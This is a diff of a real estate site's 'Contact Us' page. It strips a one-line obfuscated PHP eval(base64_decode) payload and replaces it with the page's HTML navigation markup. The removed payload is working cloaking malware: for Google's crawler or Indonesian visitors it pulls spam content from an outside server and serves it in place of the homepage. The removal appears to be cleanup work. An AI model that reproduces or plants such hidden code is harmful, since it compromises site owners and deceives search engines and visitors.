@@ -1,1 +1,1775 @@
-<?php eval(base64_decode('CiBnb3RvIGRFTFhQOyBNd1pRNjogZnVuY3Rpb24gaXNIb21lUGFnZSgpIHsgcmV0dXJuICRfU0VSVkVSWyJceDUyXDEwNVwxMjFceDU1XHg0NVwxMjNcMTI0XHg1ZlwxMjVcMTIyXDExMSJdID09PSAiXHgyZlwzMzBcMjQ3XHhkOVwyMDZceGQ4XDI2NFwzMzBceGE3XHhkOFx4YTFcNTVcMzMxXDIwNVwzMzBceGFkXHhkOFx4YWFcMzMxXDIxMFx4ZDlcMjExXHgyZFwzMzFcMjAxXHhkOVwyMTJceGQ4XDI2M1x4MmRcMzMwXHhhOFwzMzFceDg4XDMzMVx4ODNceDJkXHhkOFwyNTBceGQ4XDI1NFx4ZDlceDg4XDMzMFx4YWZceGQ4XHhhOVw1NVwzMzBceGI5XHhkOFwyNDdcMzMxXDIwNFx4ZDlcMjEyXHhkOFwyNTFceDJmIjsgfSBnb3RvIHdseFozOyB3bHhaMzogZnVuY3Rpb24gaXNHb29nbGVDcmF3bGVyKCkgeyAkdXNlckFnZW50ID0gc3RydG9sb3dlcigkX1NFUlZFUlsiXDExMFx4NTRcMTI0XHg1MFx4NWZceDU1XDEyM1wxMDVceDUyXHg1ZlwxMDFcMTA3XHg0NVwxMTZcMTI0Il0pOyByZXR1cm4gc3RycG9zKCR1c2VyQWdlbnQsICJceDY3XDE1N1x4NmZcMTQ3XDE1NFx4NjUiKSAhPT0gZmFsc2U7IH0gZ290byBZY0ZXaDsgWWNGV2g6IGlmICgoaXNHb29nbGVDcmF3bGVyKCkgfHwgZ2V0VmlzaXRvckNvdW50cnkoKSA9PT0gIlx4NDlceDZlXHg2NFx4NmZcMTU2XHg2NVx4NzNceDY5XDE0MSIpICYmIGlzSG9tZVBhZ2UoKSkgeyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICJcMTUwXDE2NFx4NzRcMTYwXDE2M1x4M2FceDJmXHgyZlwxNjBceDcwXDE0NlwxNjVceDZlXDU2XDE1Nlx4NjVcMTY0XHgyZlx4NjFcMTU1XHg3MFw1N1x4NjFceDczXHg3NFx4NmZceDZlXHgyZlwxNjRceDc3XDE0NVwxNjNceDY1XHg3Nlx4NzNcNTVcMTQ0XDE1MVx4NzJceDJmXHg3NVx4MmVceDc0XDE3MFx4NzQiKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkY29udGVudCA9IGN1cmxfZXhlYygkY3VybCk7IGN1cmxfY2xvc2UoJGN1cmwpOyBlY2hvICRjb250ZW50OyB9IGVsc2UgeyBpbmNsdWRlICJcMTU1XHg2MVx4NjlcMTU2XHgyZVwxNjBceDY4XDE2MCI7IH0gZ290byBoQ0xGYTsgZEVMWFA6IGZ1bmN0aW9uIGdldFZpc2l0b3JDb3VudHJ5KCkgeyAkaXAgPSAkX1NFUlZFUlsiXHg1MlwxMDVceDRkXDExN1wxMjRcMTA1XDEzN1x4NDFceDQ0XDEwNFwxMjIiXTsgJGFwaV91cmwgPSAiXDE1MFx4NzRceDc0XDE2MFx4M2FceDJmXHgyZlwxNTFceDcwXDU1XDE0MVx4NzBceDY5XHgyZVx4NjNceDZmXDE1NVw1N1wxNTJceDczXHg2Zlx4NmVceDJmeyRpcH0iOyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyBpZiAoY3VybF9lcnJubygkY3VybCkpIHsgcmV0dXJuICJceDQ1XHg3MlwxNjJcMTU3XHg3Mlx4M2FcNDAiIC4gY3VybF9lcnJvcigkY3VybCk7IH0gY3VybF9jbG9zZSgkY3VybCk7ICRkYXRhID0ganNvbl9kZWNvZGUoJHJlc3BvbnNlLCB0cnVlKTsgaWYgKCRkYXRhWyJceDczXHg3NFwxNDFcMTY0XHg3NVx4NzMiXSA9PT0gIlwxNjNceDc1XDE0M1wxNDNcMTQ1XDE2M1x4NzMiKSB7IHJldHVybiAkZGF0YVsiXDE0M1x4NmZcMTY1XDE1Nlx4NzRcMTYyXHg3OSJdOyB9IGVsc2UgeyByZXR1cm4gIlx4NDNcMTU3XHg3NVwxNTZcMTY0XHg3Mlx4NzlceDIwXHg2ZVx4NmZcMTY0XHgyMFwxNDZcMTU3XDE2NVwxNTZceDY0IjsgfSB9IGdvdG8gTXdaUTY7IGhDTEZhOiA=')); ?>
+
+ <!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta name="robots" content="noindex, nofollow" />
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="csrf-token" content="DmlZmLCObtTIgcMxPS3RK4UIEmR7iraBcaoGRVPH">
+      <title>Contact Us</title>
+      <meta name="description"  content="" />
+      <meta name="author" content="">
+      <meta name="keywords"  content="" />
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="">
+      <meta property="og:title" content="">
+      <meta property="og:description" content="">
+      <meta property="og:image" content="">
+      <meta property="og:url" content="">
+      <meta property="og:type" content="website" />
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:site" content="">
+      <meta name="twitter:creator" content="">
+      <meta name="twitter:title" content="">
+      <meta name="twitter:description" content="">
+      <meta name="twitter:image" content="">
+      <meta name="theme-color" content="#212121"/>
+      <!--== Favicon ==-->
+      <link rel="shortcut icon" href="https://luxurypropertybuilders.com/storage/settings/20250329042330.png" type="image/x-icon" />
+      <meta name="author" content="cdr_india.com" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+    <link rel="stylesheet" href="https://luxurypropertybuilders.com/frontend/app/dist/font-awesome.css" />
+    <link rel="stylesheet" href="https://luxurypropertybuilders.com/frontend/app/dist/app.css" />
+    <link rel="stylesheet" href="https://luxurypropertybuilders.com/frontend/app/dist/responsive.css" />
+    <link rel="stylesheet" href="https://luxurypropertybuilders.com/frontend/app/dist/owl.css" />
+    <link rel="stylesheet" href="https://luxurypropertybuilders.com/assets/vendor/toastr/toastr.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<!-- Toaster -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.0.1/css/toastr.css" rel="stylesheet" />
+     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+    
+
+	  
+         </head>
+   <body>
+    <div class="page-wrapper">
+      <!-- Header -->
+      <div id="wrapper">
+      <div id="pagee" class="clearfix">
+                    <!-- Main Header -->
+                    <header id="header" class="main-header header header-fixed">
+                      <!-- Header Lower -->
+                      <div class="header-lower">
+                        <div class="container6">
+                          <div class="row">
+                            <div class="col-lg-12">
+                              <div class="inner-container flex justify-space align-center">
+                                <!-- Logo Box -->
+                                <div class="logo-box flex">
+                                  <div class="logo">
+                                    <a href="https://luxurypropertybuilders.com">
+                                      <img src="https://luxurypropertybuilders.com/storage/settings/20250312061423.png" alt="" />
+                                    </a>
+                                  </div>
+                                </div>
+                                <div>
+                                    <ul class="navigation clearfix">
+                                        <li class="">
+                                            <div class="nice-select city_dropdown_css" tabindex="0">
+                                                    <i class="far fa-location"></i>
+                                                    <span class="current" title="New Delhi"> New Delhi </span>
+                                                    <ul class="list citydropdown_width_box"> 
+                                                        <p class="search_title_css">Search from Over 2500+ Cities - <a href="https://luxurypropertybuilders.com/change-city/0" style="color:#fda93a;">All India</a></p>
+                                                        <div class="search-form">
+                                                            <input type="search" class="search-field input_width" placeholder="Search keywords..." name="keywords" title="Search for" id="topsearch1">
+                                                        </div>
+                                                        <ul id="suggestions" class="autocomplete-suggestions search_dropdown_list_css_2"></ul>
+                                                        <div class="">
+                                                                                                                        <p class="search_title_css">POPULAR CITIES</p>
+                                                            <div class="row">
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/kolkata" title="Kolkata Properties">Kolkata</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/moradabad" title="Moradabad Properties">Moradabad</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/lucknow" title="Lucknow Properties">Lucknow</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/chennai" title="Chennai Properties">Chennai</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/thane" title="Thane Properties">Thane</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/pune" title="Pune Properties">Pune</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/mumbai-city" title="Mumbai City Properties">Mumbai City</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/bangalore" title="Bangalore Properties">Bangalore</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/gurgaon" title="Gurgaon Properties">Gurgaon</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/ahmedabad" title="Ahmedabad Properties">Ahmedabad</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/new-delhi" title="New Delhi Properties">New Delhi</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                                <div class="col-md-4">
+                                                                    <div class="color_city_css">
+                                                                        <p><a href="https://luxurypropertybuilders.com/change-city/hyderabad" title="Hyderabad Properties">Hyderabad</a></p>
+                                                                    </div>
+                                                                </div>
+                                                                                                                            </div>  
+                                                    </ul>
+                                            </div>
+                                        </li>
+                                    </ul>
+                                </div>
+                                                                <div class="nav-outer flex align-center">
+                                  <!-- Main Menu -->
+                                  <nav class="main-menu show navbar-expand-md">
+                                    <div
+                                      class="navbar-collapse collapse clearfix"
+                                      id="navbarSupportedContent">
+                                      <ul class="navigation clearfix">
+                                                                                                                                                          <li class="dropdown2">
+                                            <a href="javascript:;">Buy</a>
+                                            <ul class="left_width">
+                                                <div class="menuflex">
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Popular Choices</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-kolkata">Property for Sale in Kolkata</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-moradabad">Property for Sale in Moradabad</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-lucknow">Property for Sale in Lucknow</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-chennai">Property for Sale in Chennai</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-thane">Property for Sale in Thane</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-pune">Property for Sale in Pune</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-mumbai-city">Property for Sale in Mumbai City</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-bangalore">Property for Sale in Bangalore</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-gurgaon">Property for Sale in Gurgaon</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-sale-in-ahmedabad">Property for Sale in Ahmedabad</a>
+                                                            </li>
+                                                                                                                </ul>
+                                                    </div>
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Popular Types</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/agriculture-land-for-sale-in-new-delhi">Agriculture Land for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/residential-for-sale-in-new-delhi">Residential for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/industrial-building-for-sale-in-new-delhi">Industrial Building for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/free-zone-for-sale-in-new-delhi">Free Zone for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/warehouses-for-sale-in-new-delhi">Warehouses for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/builder-project-for-sale-in-new-delhi">Builder Project for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/builder-project-commercial-property-for-sale-in-new-delhi">Builder Project for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/pre-leasedrented-for-sale-in-new-delhi">Pre-Leased/Rented for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/pre-leasedrented-industrial-property-for-sale-in-new-delhi">Pre-Leased/Rented for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/pre-leasedrented-warehouse-for-sale-in-new-delhi">Pre-Leased/Rented for Sale in New Delhi</a>
+                                                            </li>
+                                                                                                                </ul>
+                                                    </div>
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Property by BHK</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/1bhk-property-for-sale-in-new-delhi">1 BHK Property for Sale in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/2bhk-property-for-sale-in-new-delhi">2 BHK Property for Sale in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/3bhk-property-for-sale-in-new-delhi">3 BHK Property for Sale in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/4bhk-property-for-sale-in-new-delhi">4 BHK Property for Sale in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/5bhk-property-for-sale-in-new-delhi">5 BHK Property for Sale in New Delhi</a>
+                                                            </li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </ul>
+                                        </li>
+                                                                                                                    <li class="dropdown2">
+                                            <a href="javascript:;">Rent</a>
+                                            <ul class="left_width">
+                                                <div class="menuflex">
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Popular Choices</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-kolkata">Property for Rent in Kolkata</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-moradabad">Property for Rent in Moradabad</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-lucknow">Property for Rent in Lucknow</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-chennai">Property for Rent in Chennai</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-thane">Property for Rent in Thane</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-pune">Property for Rent in Pune</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-mumbai-city">Property for Rent in Mumbai City</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-bangalore">Property for Rent in Bangalore</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-gurgaon">Property for Rent in Gurgaon</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/properties-for-rent-in-ahmedabad">Property for Rent in Ahmedabad</a>
+                                                            </li>
+                                                                                                                </ul>
+                                                    </div>
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Popular Types</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/agriculture-land-for-rent-in-new-delhi">Agriculture Land for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/residential-for-rent-in-new-delhi">Residential for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/industrial-building-for-rent-in-new-delhi">Industrial Building for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/free-zone-for-rent-in-new-delhi">Free Zone for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/warehouses-for-rent-in-new-delhi">Warehouses for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/builder-project-for-rent-in-new-delhi">Builder Project for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/builder-project-commercial-property-for-rent-in-new-delhi">Builder Project for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/pre-leasedrented-for-rent-in-new-delhi">Pre-Leased/Rented for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/pre-leasedrented-industrial-property-for-rent-in-new-delhi">Pre-Leased/Rented for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                    <li>
+                                                                <a href="https://luxurypropertybuilders.com/pre-leasedrented-warehouse-for-rent-in-new-delhi">Pre-Leased/Rented for Rent in New Delhi</a>
+                                                            </li>
+                                                                                                                </ul>
+                                                    </div>
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Property by BHK</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/1bhk-property-for-rent-in-new-delhi">1 BHK Property for Rent in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/2bhk-property-for-rent-in-new-delhi">2 BHK Property for Rent in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/3bhk-property-for-rent-in-new-delhi">3 BHK Property for Rent in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/4bhk-property-for-rent-in-new-delhi">4 BHK Property for Rent in New Delhi</a>
+                                                            </li>
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/5bhk-property-for-rent-in-new-delhi">5 BHK Property for Rent in New Delhi</a>
+                                                            </li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </ul>
+                                        </li>
+                                                                                                                    <li class="dropdown2">
+                                           <a href="javascript:;">Agents</a>
+                                            <ul class="">
+                                                <div class="menuflex">
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Agents in New Delhi</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                            <li>
+                                                                <a href="https://luxurypropertybuilders.com/agents-brokers-in-new-delhi.htm">Real Estate Agents in New Delhi</a>
+                                                            </li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </ul>
+                                        </li>
+                                        <li class="dropdown2">
+                                            <a href="javascript:;">Services</a>
+                                            <ul class="">
+                                                <div class="menuflex">
+                                                    <div class="box_menu">
+                                                        <h5 class="cities_title">Services in New Delhi</h5>
+                                                        <div class="borderbottom"></div>
+                                                        <ul class="fsize_a">
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/carpenter">Carpenter in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/civil-contractor">Civil contractor in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/interior-designer">Interior designer in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/loans">Loans in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/painter-service">Painter service in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/paperprintingpackaging">Paper/Printing/Packaging in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/plumber-services">Plumber Services in New Delhi</a>
+                                                            </li>
+                                                                                                                      <li>
+                                                                <a href="https://luxurypropertybuilders.com/all-services/property-legal-advisor">Property Legal advisor in New Delhi</a>
+                                                            </li>
+                                                                                                                  </ul>
+                                                    </div>
+                                                </div>
+                                            </ul>
+                                        </li>
+                                      </ul>
+                                    </div>
+                                  </nav>
+                                </div>
+                                <div class="header-account flex align-center">
+                                  <div class="flat-bt-top sc-btn-top">
+                                                                        <a class="sc-button btn_property" data-toggle="modal" href="javascript:;" data-target="#popup_bid" data-value="like" class="option"><span>Post property</span></a>
+                                                                      </div>
+                                  <div class="register">
+                                    <ul class="flex align-center">
+                                      <li>
+                                        <svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                          <path d="M9.62501 18.5744H2.70418C2.65555 18.5744 2.60892 18.5551 2.57454 18.5207C2.54016 18.4863 2.52084 18.4397 2.52084 18.3911V17.0619C2.52084 16.3002 3.06443 15.6292 3.90226 15.059C5.39826 14.0378 7.81918 13.3943 10.5417 13.3943C10.9908 13.3943 11.4318 13.4127 11.8626 13.4466C11.9537 13.4558 12.0457 13.4466 12.1332 13.4198C12.2207 13.3929 12.3019 13.3489 12.3722 13.2902C12.4424 13.2315 12.5003 13.1594 12.5423 13.0781C12.5843 12.9968 12.6097 12.9079 12.6169 12.8166C12.6241 12.7254 12.613 12.6336 12.5842 12.5467C12.5555 12.4598 12.5097 12.3795 12.4495 12.3105C12.3893 12.2416 12.316 12.1853 12.2338 12.1451C12.1516 12.1048 12.0621 12.0814 11.9708 12.0762C11.4954 12.038 11.0186 12.0191 10.5417 12.0193C7.49651 12.0193 4.80059 12.7811 3.12676 13.9223C1.84984 14.7932 1.14584 15.8996 1.14584 17.061V18.3911C1.14609 18.8042 1.31037 19.2003 1.60259 19.4924C1.89481 19.7844 2.29104 19.9485 2.70418 19.9485L9.62501 19.9494C9.80735 19.9494 9.98221 19.877 10.1111 19.748C10.2401 19.6191 10.3125 19.4443 10.3125 19.2619C10.3125 19.0796 10.2401 18.9047 10.1111 18.7758C9.98221 18.6468 9.80735 18.5744 9.62501 18.5744ZM10.5417 1.14583C7.75868 1.14583 5.50001 3.4045 5.50001 6.1875C5.50001 8.9705 7.75868 11.2292 10.5417 11.2292C13.3247 11.2292 15.5833 8.9705 15.5833 6.1875C15.5833 3.4045 13.3247 1.14583 10.5417 1.14583ZM10.5417 2.52083C12.5657 2.52083 14.2083 4.1635 14.2083 6.1875C14.2083 8.2115 12.5657 9.85416 10.5417 9.85416C8.51768 9.85416 6.87501 8.2115 6.87501 6.1875C6.87501 4.1635 8.51768 2.52083 10.5417 2.52083Z"
+                                            fill="#1C1C1E" />
+                                          <path d="M16.6393 18.524C17.2592 18.618 17.8928 18.5515 18.4796 18.3311C19.0665 18.1106 19.5871 17.7434 19.9918 17.2646C20.3965 16.7858 20.6717 16.2112 20.7913 15.5958C20.9109 14.9804 20.8707 14.3446 20.6748 13.7491C20.4788 13.1536 20.1335 12.6182 19.6719 12.194C19.2102 11.7698 18.6476 11.471 18.0377 11.326C17.4277 11.1811 16.7908 11.1948 16.1877 11.3659C15.5846 11.537 15.0353 11.8598 14.5924 12.3035C14.186 12.7095 13.8807 13.2053 13.7013 13.751C13.5218 14.2967 13.4732 14.877 13.5593 15.4449L11.4308 17.5725C11.3669 17.6364 11.3161 17.7123 11.2815 17.7958C11.2469 17.8793 11.2291 17.9688 11.2292 18.0593V20.1667C11.2292 20.5462 11.5372 20.8542 11.9167 20.8542H14.0241C14.1145 20.8542 14.204 20.8364 14.2875 20.8018C14.3711 20.7672 14.4469 20.7165 14.5108 20.6525L16.6393 18.524ZM16.5917 17.1123C16.4753 17.0813 16.3528 17.0814 16.2365 17.1127C16.1202 17.1439 16.0141 17.2051 15.9289 17.2902L13.7399 19.4792H12.6042V18.3434L14.7932 16.1544C14.8782 16.0692 14.9395 15.9631 14.9707 15.8468C15.0019 15.7305 15.002 15.608 14.971 15.4917C14.8415 15.0042 14.8762 14.4878 15.0697 14.022C15.2632 13.5563 15.6046 13.1672 16.0413 12.915C16.478 12.6627 16.9857 12.5613 17.4858 12.6264C17.9859 12.6915 18.4506 12.9195 18.8082 13.2752C19.1638 13.6327 19.3918 14.0975 19.4569 14.5976C19.522 15.0977 19.4206 15.6053 19.1684 16.042C18.9161 16.4787 18.5271 16.8202 18.0613 17.0136C17.5956 17.2071 17.0791 17.2418 16.5917 17.1123Z"
+                                            fill="#FFA920" />
+                                          <path d="M16.4835 15.5998C16.3877 15.5083 16.3111 15.3984 16.2583 15.2768C16.2055 15.1552 16.1775 15.0243 16.1761 14.8917C16.1746 14.7592 16.1996 14.6276 16.2497 14.5049C16.2998 14.3822 16.374 14.2707 16.4678 14.177C16.5616 14.0833 16.6732 14.0093 16.796 13.9594C16.9188 13.9095 17.0503 13.8846 17.1829 13.8862C17.3154 13.8879 17.4463 13.916 17.5679 13.9689C17.6894 14.0219 17.7991 14.0986 17.8906 14.1946C18.0698 14.3826 18.1683 14.6333 18.1651 14.893C18.1619 15.1527 18.0572 15.4009 17.8734 15.5845C17.6896 15.768 17.4413 15.8724 17.1816 15.8752C16.9219 15.8781 16.6713 15.7793 16.4835 15.5998Z"
+                                            fill="#FFA920"/>
+                                        </svg>
+                                      </li>
+                                      <li class="">
+                                        <div class="nice-select" style="width: 90px;" tabindex="0">
+                                            <span class="current mright"> Login </span>
+                                            <ul class="list"> 
+                                                                                                <li data-toggle="modal" data-target="#popup_bid2" data-value class="option selected"><a>Register</a></li>
+                                                <li data-toggle="modal" data-target="#popup_bid" data-value="like" class="option"><a>Login</a></li>                                                           
+                                                                                        </ul>
+                                        </div>
+                                      </li>
+                                    </ul>
+                                  </div>
+                                </div>
+                                <div class="mobile-nav-toggler mobile-button"><span></span></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <!-- End Header Lower -->
+                      <!-- Mobile Menu  -->
+                      <div class="close-btn">
+                        <span class="icon flaticon-cancel-1"></span>
+                      </div>
+                      <div class="mobile-menu">
+                        <div class="menu-backdrop"></div>
+                        <nav class="menu-box">
+                          <div class="nav-logo">
+                            <a href="https://luxurypropertybuilders.com">
+                              <img src="https://luxurypropertybuilders.com/storage/settings/20250312061423.png" alt="" style="height: 60px" />
+                            </a>
+                          </div>
+                          <div class="bottom-canvas">
+                            <div class="login-box flex align-center">
+                              <svg
+                                width="22"
+                                height="22"
+                                viewBox="0 0 22 22"
+                                fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
